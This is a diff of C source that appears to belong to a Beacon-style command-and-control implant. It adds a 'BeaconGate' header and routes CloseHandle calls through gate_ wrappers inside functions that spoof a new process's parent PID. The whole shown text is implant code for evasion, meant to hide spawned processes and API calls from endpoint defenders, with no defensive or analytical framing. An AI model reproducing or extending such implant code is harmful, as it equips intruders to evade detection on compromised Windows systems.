@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -71,7 +72,7 @@ BOOL process_ppid_pre(void * thisp, int ppid, void * pattr, void * siptr) {
 	/* set the parent process attribute */
 	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &(mods->harg), sizeof(HANDLE), NULL, NULL)) {
 		post_error_d(0x47, GetLastError());
-		CloseHandle(hParentProcess);
+		gate_CloseHandle(hParentProcess);
 		return FALSE;
 	}
 
@@ -94,7 +95,7 @@ BOOL process_ppid_pre(void * thisp, int ppid, void * pattr, void * siptr) {
 /* close the handle to our parent process, pls */
 void process_ppid_post(void * thisp) {
 	EX_ATTR_MOD * mods = (EX_ATTR_MOD *)thisp;
-	CloseHandle(mods->harg);
+	gate_CloseHandle(mods->harg);
 }
 
 EX_ATTR_MOD process_ppid() {
